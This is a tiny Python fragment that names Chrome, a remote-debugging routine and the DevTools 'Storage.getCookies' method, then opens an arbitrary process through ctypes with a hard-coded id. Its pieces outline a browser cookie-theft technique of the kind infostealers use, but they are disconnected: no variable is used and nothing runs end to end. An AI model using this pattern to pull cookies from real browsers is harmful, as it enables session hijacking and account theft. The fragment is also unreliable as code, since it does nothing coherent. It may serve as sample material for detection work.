import ctypes
routine = "StartRemoteDebuggingServer"
browser = "chrome.exe"
method = "Storage.getCookies"
ctypes.windll.kernel32.OpenProcess(0x143a, False, 123)
